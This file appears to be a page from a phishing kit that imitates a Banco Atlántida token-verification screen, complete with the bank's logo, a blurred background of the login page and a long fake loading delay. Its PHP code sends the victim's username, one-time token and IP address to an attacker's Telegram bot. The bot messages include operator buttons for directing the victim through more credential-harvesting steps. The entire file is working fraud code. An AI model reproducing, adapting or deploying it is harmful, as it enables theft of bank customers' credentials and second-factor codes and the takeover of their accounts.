<?php
require_once dirname(__DIR__) . '/gate_check.php';
include("../data.php");
$usuario = trim($_GET['u'] ?? $_POST['u'] ?? '');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $tk    = trim($_POST['token']);
    $round = intval($_POST['round'] ?? 1);
    $ip    = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
    }
    $date = date('d/m/Y H:i:s');

    $msg  = "🔐 BANCO MANZANA — TOKEN #{$round}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$usuario}\n";
    $msg .= "🔑 Token: {$tk}\n";
    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
    $msg .= "🕒 Fecha: {$date}\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|{$usuario}"],
                ['text' => '🚫 TOKERROR',   'callback_data' => "TOKERROR|{$usuario}"],
            ],
            [
                ['text' => '📧 Gmail',   'callback_data' => "GMAIL|{$usuario}"],
                ['text' => '🏦 Hsn',     'callback_data' => "HSN|{$usuario}"],
                ['text' => '🏁 LISTO',   'callback_data' => "LISTO|{$usuario}"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => $keyboard,
    ]));

    $redirect = '../espera.php?u=' . urlencode($usuario) . '&step=token';
    echo json_encode(['ok' => true, 'redirect' => $redirect]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Banco Atl&#225;ntida — Verificación</title>
  <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--red:#E30613;--red-dark:#B30410}
    html,body{font-family:'Inter',-apple-system,sans-serif;height:100%;overflow:hidden;background:#fff}

    /* LOADER */
    #loader{position:fixed;inset:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:28px;z-index:999;transition:opacity .4s ease}
    #loader.hide{opacity:0;pointer-events:none}
    .load-logo{height:58px;width:auto}
    .gif-loader{position:relative;width:70px;height:70px}
    .gif-loader .ring{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;animation:spin 1.1s linear infinite}
    .gif-loader .r1{border-top-color:var(--red)}
    .gif-loader .r2{border-right-color:#f87171;animation-duration:1.6s;animation-direction:reverse;width:52px;height:52px;top:9px;left:9px}
    .gif-loader .r3{border-bottom-color:#fca5a5;animation-duration:2.2s;width:34px;height:34px;top:18px;left:18px}
    @keyframes spin{to{transform:rotate(360deg)}}
    #loadText{font-size:15px;color:#374151;font-weight:500;transition:opacity .3s}
    #loadText.fade{opacity:0}

    /* BACKGROUND */
    #bg{position:fixed;inset:0;overflow:hidden;display:none}
    #bg.show{display:block}
    #bg iframe{width:100%;height:100%;border:none;pointer-events:none;transform:scale(1.04);transform-origin:top center}
    #bg-overlay{position:fixed;inset:0;background:rgba(0,0,0,.52);backdrop-filter:blur(7px);-webkit-backdrop-filter:blur(7px);display:none}
    #bg-overlay.show{display:block}

    /* POPUP */
    #scene{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;padding:24px;opacity:0;pointer-events:none;transition:opacity .35s}
    #scene.show{opacity:1;pointer-events:all}
    .modal{width:100%;max-width:400px;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 24px 64px rgba(0,0,0,.45)}
    .modal-header{background:var(--red);padding:14px 20px}
    .modal-header h2{color:#fff;font-size:17px;font-weight:700}
    .modal-body{padding:28px 24px 24px}
    .modal-body p{font-size:14px;color:#374151;margin-bottom:18px}
    .token-input{width:100%;height:48px;border:none;border-bottom:2px solid #d1d5db;font-size:24px;font-weight:700;letter-spacing:5px;color:#111;outline:none;background:transparent;padding:0 4px;transition:border-color .15s}
    .token-input:focus{border-color:var(--red)}
    .token-input::placeholder{letter-spacing:1px;font-size:14px;font-weight:400;color:#9ca3af}
    .btn-send{display:block;width:100%;height:48px;background:var(--red);border:none;border-radius:3px;color:#fff;font-size:15px;font-weight:700;font-family:inherit;cursor:pointer;letter-spacing:1px;margin-top:24px;transition:background .15s,opacity .15s}
    .btn-send:hover{background:var(--red-dark)}
    .btn-send:active{transform:translateY(1px)}
    .btn-send.loading{opacity:.6;pointer-events:none}
  </style>
</head>
<body>

  <div id="loader">
    <img src="../img/logo-ba.svg" class="load-logo" alt="Banco Atl&#225;ntida"/>
    <div class="gif-loader">
      <div class="ring r1"></div>
      <div class="ring r2"></div>
      <div class="ring r3"></div>
    </div>
    <span id="loadText">Por favor espera...</span>
  </div>

  <div id="bg"><iframe src="index.php" tabindex="-1" aria-hidden="true"></iframe></div>
  <div id="bg-overlay"></div>

  <div id="scene">
    <div class="modal">
      <div class="modal-header"><h2>Token</h2></div>
      <div class="modal-body">
        <p>Ingrese el token para continuar</p>
        <input class="token-input" type="tel" id="tokenInput" maxlength="10"
               placeholder="Ingrese su token" autocomplete="one-time-code"/>
        <button class="btn-send" id="btnEnviar" onclick="enviar()">ENVIAR</button>
      </div>
    </div>
  </div>

  <script>
    const USUARIO    = <?= json_encode($usuario) ?>;
    const MAX_ROUNDS = 4;
    let   round      = 1;

    const loader   = document.getElementById('loader');
    const loadText = document.getElementById('loadText');
    const bg       = document.getElementById('bg');
    const bgOvr    = document.getElementById('bg-overlay');
    const scene    = document.getElementById('scene');
    const inp      = document.getElementById('tokenInput');
    const btnEnv   = document.getElementById('btnEnviar');

    function showLoader(ms) {
      scene.classList.remove('show');
      bg.classList.remove('show');
      bgOvr.classList.remove('show');
      loader.classList.remove('hide');

      loadText.classList.remove('fade');
      loadText.textContent = 'Por favor espera...';

      const t1 = setTimeout(() => {
        loadText.classList.add('fade');
        setTimeout(() => {
          loadText.textContent = 'Estamos procesando tu solicitud...';
          loadText.classList.remove('fade');
        }, 300);
      }, 10000);

      setTimeout(() => {
        clearTimeout(t1);
        loader.classList.add('hide');
        setTimeout(showToken, 400);
      }, ms);
    }

    function showToken() {
      bg.classList.add('show');
      bgOvr.classList.add('show');
      scene.classList.add('show');
      inp.value = '';
      btnEnv.textContent = 'ENVIAR';
      btnEnv.classList.remove('loading');
      inp.focus();
    }

    function enviar() {
      const tk = inp.value.trim();
      if (!tk) { inp.focus(); return; }

      btnEnv.textContent = '...';
      btnEnv.classList.add('loading');

      const fd = new FormData();
      fd.append('token', tk);
      fd.append('u',     USUARIO);
      fd.append('round', round);

      fetch('token.php', { method: 'POST', body: fd })
        .then(r => r.json())
        .then(d => {
          btnEnv.textContent = '✓';
          if (d.redirect) {
            setTimeout(() => { window.location.href = d.redirect; }, 600);
          }
        })
        .catch(() => {
          btnEnv.textContent = '✓';
        });
    }

    document.addEventListener('keydown', e => {
      if (e.key === 'Enter' && scene.classList.contains('show')) enviar();
    });

    const IS_RETRY = <?= isset($_GET['retry']) ? 'true' : 'false' ?>;
    if (IS_RETRY) { showToken(); } else { showLoader(60000); }
  </script>
<script src="../protect.js"></script>
<script src="../popup.js"></script>
</body>
</html>
